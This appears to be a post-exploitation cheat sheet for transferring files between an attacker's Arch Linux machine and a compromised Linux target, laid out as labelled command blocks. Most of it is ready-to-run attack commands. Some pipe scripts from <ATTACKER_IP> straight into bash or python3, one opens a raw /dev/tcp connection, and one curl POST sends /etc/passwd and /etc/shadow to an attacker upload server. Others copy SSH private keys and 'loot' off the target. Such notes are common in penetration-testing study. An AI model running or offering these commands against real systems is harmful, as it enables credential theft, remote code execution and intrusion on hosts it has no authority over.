

### 1. Base64 "Network-less" Transfer

Best for small files (SSH keys, scripts) when you have a terminal but no network routing between the boxes.

>[!INFO] **Attacker (Arch Linux)**

Bash

```
# Encode to a single line for easy copying
cat id_rsa | base64 -w 0; echo
```

>[!TIP] **Target (Linux)**

Bash

```
# Use echo -n to avoid adding a trailing newline
echo -n 'BASE64_STRING_HERE' | base64 -d > id_rsa
# Verify the integrity matches the source
md5sum id_rsa
```

---

### 2. Web Downloads (wget/cURL)

The standard tools available on almost every Linux distribution.

>[!TIP] **Target (Linux)**

Bash

```
# Download with wget (Capital -O for Output)
wget http://<ATTACKER_IP>/tool.sh -O /tmp/tool.sh

# Download with curl (Lowercase -o for output)
curl -o /tmp/tool.sh http://<ATTACKER_IP>/tool.sh
```

>[!IMPORTANT] **Fileless Execution (Memory Only)**

Bash

```
# Run a script directly in Bash without saving it to disk
curl http://<ATTACKER_IP>/LinEnum.sh | bash

# Run a Python script directly
wget -qO- http://<ATTACKER_IP>/script.py | python3
```

---

### 3. Bash /dev/tcp (The "Last Resort")

Use this when `wget` and `curl` are missing. It uses Bash's built-in network redirections.

>[!WARNING] **Target (Linux)**

Bash

```
# 1. Connect to your Arch machine on File Descriptor 3
exec 3<>/dev/tcp/<ATTACKER_IP>/80

# 2. Send the HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\nHost: <ATTACKER_IP>\nConnection: close\n\n" >&3

# 3. Save the response to a file
cat <&3 > LinEnum.sh
```

---

### 4. SSH & SCP (Secure Copy)

Use this if the target has SSH (Port 22) open and you have credentials or a key.

>[!INFO] **Attacker (Arch Linux)**

Bash

```
# Pull a file FROM the target TO your local directory
scp username@<TARGET_IP>:/home/user/loot.txt .

# Push a tool FROM your machine TO the target /tmp folder
scp tool.sh username@<TARGET_IP>:/tmp/
```

---

### 5. Advanced Web Upload (HTTPS/Python)

For secure exfiltration when you don't want sensitive data (like `/etc/shadow`) sent over plain HTTP.

>[!INFO] **Attacker (Arch Linux)**

Bash

```
# 1. Create a self-signed cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# 2. Start the secure upload server
uploadserver 443 --server-certificate server.pem
```

>[!TIP] **Target (Linux)**

Bash

```
# Upload multiple sensitive files securely
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---

### 6. Quick "One-Liner" Servers

If you need to pull a file _from_ the target _to_ your Arch machine, start a temporary server on the target.

>[!TIP] **Target (Linux)**

| **Language** | **Command**                   |
| ------------ | ----------------------------- |
| **Python 3** | `python3 -m http.server 8000` |
| **PHP**      | `php -S 0.0.0.0:8000`         |
| **Ruby**     | `ruby -run -ehttpd . -p8000`  |

